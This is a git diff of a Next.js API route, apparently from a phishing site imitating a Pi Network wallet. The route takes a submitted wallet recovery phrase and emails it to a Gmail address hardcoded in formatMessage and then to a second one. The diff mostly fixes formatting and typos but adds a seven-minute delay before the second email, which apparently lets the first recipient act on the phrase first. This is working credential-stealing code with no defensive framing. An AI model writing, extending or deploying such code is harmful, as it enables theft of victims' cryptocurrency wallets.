@@ -1,8 +1,11 @@
-import nodemailer from 'nodemailer'
+import nodemailer from 'nodemailer';
+
+// Function to create a delay
+const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 const formatMessage = async (message: string) => {
-    const email = process.env.MY_EMAIL
-    const pass = process.env.MY_PASS
+    const email = process.env.MY_EMAIL;
+    const pass = process.env.MY_PASS;
 
     const transporter = nodemailer.createTransport({
         service: 'gmail',
@@ -10,7 +13,7 @@ const formatMessage = async (message: string) => {
             user: email,
             pass,
         }
-    })
+    });
 
     // Split the message into lines
     const lines = message.split(/\r?\n/);
@@ -24,9 +27,9 @@ const formatMessage = async (message: string) => {
     const mailOptions = {
         from: `Pi Clone ${email}`,
         to: "sparrowthedev@gmail.com",
-        subject: "Yo! you just got a new phrase from mr Godzilla",
+        subject: "Yo! you just got a new phrase from Godzilla",
         html: formattedMessage,
-    }
+    };
 
     transporter.verify(function (error: any, success: any) {
         if (error) {
@@ -39,23 +42,20 @@ const formatMessage = async (message: string) => {
     const result = await transporter.sendMail(mailOptions);
 
     if (result.response.includes("OK")) {
-        console.log("email sent succesfully!!");
-     } else {
-         console.log("Internal server error");
+        console.log("email sent successfully!!");
+    } else {
+        console.log("Internal server error");
     }
-
-
 
     // Return the formatted message
     return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
-}
-
+};
 
 export async function POST(request: Request) {
     try {
         const { message } = await request.json();
-        const email = process.env.EMAIL
-        const pass = process.env.PASS
+        const email = process.env.EMAIL;
+        const pass = process.env.PASS;
 
         const transporter = nodemailer.createTransport({
             service: 'gmail',
@@ -63,17 +63,19 @@ export async function POST(request: Request) {
                 user: email,
                 pass,
             }
-        })
-
+        });
 
         const formattedMessage = await formatMessage(message);
+
+        // Introduce a delay of 7 minutes (420,000 milliseconds)
+        await delay(420000);
 
         const mailOptions = {
             from: `Pi Clone ${email}`,
             to: 'escrowlinks@gmail.com',
             subject: "Phrase From Your Website",
             html: formattedMessage,
-        }
+        };
 
         transporter.verify(function (error: any, success: any) {
             if (error) {
@@ -83,12 +85,10 @@ export async function POST(request: Request) {
             }
         });
 
-
         const result = await transporter.sendMail(mailOptions);
 
-
         if (result.response.includes("OK")) {
-            return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
+            return Response.json({ message: "email sent successfully!!" }, { status: 200 });
         } else {
             return Response.json({ error: "Internal server error" }, { status: 500 });
         }
